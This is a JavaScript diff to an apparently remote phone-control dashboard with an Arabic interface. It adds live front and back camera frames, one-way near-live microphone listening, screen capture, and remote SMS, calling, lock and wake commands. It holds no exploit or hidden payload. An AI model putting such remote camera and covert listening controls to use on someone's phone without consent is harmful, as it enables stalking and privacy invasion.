@@ -1,8 +1,8 @@
-import { h, fmtDateTime, emptyState, errorBox } from "../util.js";
+import { h, fmtDateTime, emptyState } from "../util.js";
 
 /**
  * قسم "مباشر": كاميرات أمامية/خلفية بمربعات تحديد، شاشة، مايك أحادي الاتجاه،
- * تسجيل لحظي، إرسال رسالة، اتصال، لقطة شاشة.
+ * تسجيل لحظي، إرسال رسالة، اتصال (مع اختيار الشريحة)، لقطة شاشة.
  * يعتمد على مجموعة live/{front,back,screen,mic} في Firestore.
  */
 export function render(container, ctx) {
@@ -14,16 +14,20 @@ export function render(container, ctx) {
   const saved = readState(storeKey);
 
   // ---------- الكاميرات ----------
-  root.append(sectionTitle("🎥", "الكاميرات", "حدّد المربع لتشغيل الكاميرا، وألغِه للإيقاف"));
+  root.append(sectionTitle("🎥", "الكاميرات", "حدّد المربع لتشغيل الكاميرا، وألغِه للإيقاف (صورة كل ثانيتين)"));
   const cams = h("div", { class: "live-grid" });
   const front = cameraCard("front", "الكاميرا الأمامية", ctx, saved, storeKey);
   const back = cameraCard("back", "الكاميرا الخلفية", ctx, saved, storeKey);
   cams.append(front.card, back.card);
   root.append(cams);
+  root.append(h("div", { class: "actions-row" }, [
+    actionButton("⏹️", "إيقاف الكاميرتين", () => send("camera_stop", {}, ctx)),
+  ]));
 
   // ---------- الشاشة ----------
-  root.append(sectionTitle("🖥️", "الشاشة", "تُعرض صورة محدثة كل 4 ثوانٍ بعد الموافقة على الجهاز مرة واحدة"));
+  root.append(sectionTitle("🖥️", "الشاشة", "صورة محدثة كل 3 ثوانٍ بعد الموافقة على الجهاز مرة لكل جلسة"));
   const screenImg = h("img", { class: "live-frame", alt: "الشاشة" });
+  screenImg.style.display = "none";
   const screenInfo = h("div", { class: "muted small", text: "لا توجد لقطة بعد" });
   const screenCard = h("div", { class: "card live-card" }, [
     h("div", { class: "live-head" }, [h("span", { class: "live-dot" }), h("strong", { text: "شاشة الجهاز" })]),
@@ -32,13 +36,14 @@ export function render(container, ctx) {
     h("div", { class: "actions-row" }, [
       actionButton("📸", "لقطة الآن", () => send("take_screenshot", {}, ctx)),
       actionButton("🔄", "فحص الحالة", () => send("screen_status", {}, ctx)),
+      actionButton("⏹️", "إيقاف المشاركة", () => send("screen_stop", {}, ctx)),
     ]),
-    h("div", { class: "muted small", text: "لبدء البث: افتح التطبيق على الجهاز ← «مشاركة الشاشة» ← الموافقة مرة واحدة." }),
+    h("div", { class: "muted small", text: "لبدء البث: افتح التطبيق ← «مشاركة الشاشة» ← موافق مرة واحدة. اللقطات تُحفظ في قسم الوسائط مع زر حذف." }),
   ]);
   root.append(screenCard);
 
   // ---------- المايك ----------
-  root.append(sectionTitle("🎙️", "المايك", "استماع أحادي: تسمع ما حول الجهاز، والجهاز لا يسمعك"));
+  root.append(sectionTitle("🎙️", "المايك", "استماع أحادي متتابع: تسمع ما حول الجهاز، والجهاز لا يسمعك"));
   const micBox = h("input", { type: "checkbox" });
   micBox.checked = !!saved.mic;
   const micStatus = h("div", { class: "muted small", text: micBox.checked ? "المايك مفتوح" : "المايك مغلق" });
@@ -48,7 +53,7 @@ export function render(container, ctx) {
     h("label", { class: "live-check" }, [micBox, h("strong", { text: "فتح مايك الجهاز (استماع فقط)" })]),
     micStatus,
     audio,
-    h("div", { class: "muted small", text: "يُشغّل المقاطع تلقائياً بالترتيب (مقطع كل 10 ثوانٍ)." }),
+    h("div", { class: "muted small", text: "مقاطع 3 ثوانٍ تُشغّل تلقائياً بالترتيب = بث شبه لحظي." }),
     h("div", { class: "actions-row" }, [
       actionButton("⏺️", "تسجيل لحظي (30 ث)", () => send("record_mic", {}, ctx)),
     ]),
@@ -66,6 +71,7 @@ export function render(container, ctx) {
   // ---------- أوامر سريعة ----------
   root.append(sectionTitle("⚡", "أوامر سريعة"));
   const actions = h("div", { class: "actions-row" }, [
+    actionButton("📞", "إجراء مكالمة", () => openCallModal(ctx)),
     actionButton("✉️", "إرسال رسالة", () => promptCommand(ctx, {
       title: "إرسال رسالة",
       fields: [
@@ -75,15 +81,10 @@ export function render(container, ctx) {
       type: "send_message",
       okText: "إرسال",
     })),
-    actionButton("📞", "إجراء مكالمة", () => promptCommand(ctx, {
-      title: "إجراء مكالمة",
-      fields: [{ name: "number", label: "رقم الهاتف", placeholder: "05xxxxxxxx", required: true }],
-      type: "make_call",
-      okText: "اتصال",
-    })),
     actionButton("📷", "صورة من الجهاز", () => send("take_photo", {}, ctx)),
     actionButton("🔔", "رنين الجهاز", () => send("ring", {}, ctx)),
     actionButton("🔒", "قفل الجهاز", () => send("lock", {}, ctx)),
+    actionButton("💡", "إيقاظ الشاشة", () => send("wake", {}, ctx)),
     actionButton("🔄", "مزامنة الآن", () => send("sync_now", {}, ctx)),
   ]);
   root.append(actions);
@@ -95,8 +96,8 @@ export function render(container, ctx) {
       return;
     }
     const live = data || {};
-    applyCamera(front, live.front);
-    applyCamera(back, live.back);
+    front.setFrame(live.front);
+    back.setFrame(live.back);
     applyScreen(live.screen);
     applyMic(live.mic);
   });
@@ -113,8 +114,18 @@ export function render(container, ctx) {
       return;
     }
     for (const clip of clips) {
+      const del = h("button", { class: "icon-btn danger", type: "button", title: "حذف التسجيل", text: "🗑" });
+      del.addEventListener("click", async () => {
+        try {
+          if (ctx.data.deleteMediaItem) await ctx.data.deleteMediaItem(ctx.uid, ctx.deviceId, clip);
+          ctx.toast("تم حذف التسجيل");
+        } catch { ctx.toast("تعذر الحذف", "error"); }
+      });
       micList.append(h("div", { class: "clip-row" }, [
-        h("div", { class: "clip-name", text: clip.name || "تسجيل" }),
+        h("div", { class: "clip-head" }, [
+          h("div", { class: "clip-name", text: clip.name || "تسجيل" }),
+          del,
+        ]),
         h("audio", { controls: true, preload: "none", src: clip.url || clip.dataUrl }),
         h("div", { class: "muted small", text: fmtDateTime(clip.timestamp) }),
       ]));
@@ -123,13 +134,12 @@ export function render(container, ctx) {
 
   // ---------- طابور تشغيل المايك ----------
   const queue = [];
-  let currentSrc = "";
   let playing = false;
   let lastMicTs = 0;
 
   function applyMic(mic) {
     if (!mic) return;
-    const ts = Number(mic.timestamp) || 0;
+    const ts = Number(mic.updatedAt || mic.timestamp) || 0;
     if (ts <= lastMicTs) return;
     lastMicTs = ts;
     const src = mic.url || mic.dataUrl;
@@ -138,6 +148,7 @@ export function render(container, ctx) {
       return;
     }
     queue.push(src);
+    if (queue.length > 12) queue.shift();
     if (!playing) playNext();
   }
 
@@ -145,14 +156,12 @@ export function render(container, ctx) {
     const src = queue.shift();
     if (!src) {
       playing = false;
-      audio.pause();
       return;
     }
     playing = true;
-    currentSrc = src;
     audio.src = src;
     audio.play().catch(() => {
-      micStatus.textContent = "اضغط تشغيل على المشغّل لبدء الصوت";
+      micStatus.textContent = "اضغط تشغيل على المشغّل مرة واحدة لبدء الصوت";
       playing = false;
     });
   }
@@ -221,10 +230,6 @@ function cameraCard(kind, label, ctx, saved, storeKey) {
   };
 }
 
-function applyCamera(camCard, data) {
-  camCard.setFrame(data);
-}
-
 function actionButton(icon, label, onClick) {
   const btn = h("button", { class: "action-btn", type: "button" }, [
     h("span", { text: icon }),
@@ -232,6 +237,50 @@ function actionButton(icon, label, onClick) {
   ]);
   btn.addEventListener("click", onClick);
   return btn;
+}
+
+/** نافذة اتصال مع اختيار الشريحة (dual SIM). */
+async function openCallModal(ctx) {
+  let sims = [];
+  try {
+    const dev = ctx.data.getDeviceOnce ? await ctx.data.getDeviceOnce(ctx.uid, ctx.deviceId) : null;
+    sims = dev?.raw?.sims || dev?.sims || [];
+  } catch { sims = []; }
+
+  const overlay = h("div", { class: "modal-overlay show" });
+  const card = h("div", { class: "modal-card" });
+  const num = h("input", { class: "input", type: "tel", placeholder: "05xxxxxxxx", dir: "ltr", inputmode: "tel" });
+  const sel = h("select", { class: "input select" });
+  sel.append(h("option", { value: "", text: sims.length ? "الشريحة الافتراضية" : "لا توجد شرائح معروفة (سيستخدم الافتراضي)" }));
+  sims.forEach((s, i) => {
+    sel.append(h("option", { value: String(s.index ?? i), text: s.label || `SIM ${i + 1}` }));
+  });
+  const okBtn = h("button", { class: "btn primary", type: "button", text: "اتصال" });
+  const cancel = h("button", { class: "btn ghost", type: "button", text: "إلغاء" });
+
+  card.append(
+    h("h3", { text: "إجراء مكالمة" }),
+    h("div", { class: "muted small", text: "المكالمة تُنفَّذ من الجهاز حتى لو كانت الشاشة مقفلة." }),
+    h("label", { class: "field" }, [h("span", { text: "رقم الهاتف" }), num]),
+    h("label", { class: "field" }, [h("span", { text: "خط الاتصال" }), sel]),
+    h("div", { class: "modal-actions" }, [okBtn, cancel]),
+  );
+  overlay.append(card);
+
+  const close = () => overlay.remove();
+  cancel.addEventListener("click", close);
+  overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
+  okBtn.addEventListener("click", () => {
+    const number = num.value.trim();
+    if (!number) { num.focus(); return; }
+    const payload = { number };
+    if (sel.value !== "") payload.simIndex = Number(sel.value);
+    close();
+    send("make_call", payload, ctx);
+  });
+
+  document.body.append(overlay);
+  num.focus();
 }
 
 async function promptCommand(ctx, { title, fields, type, okText }) {
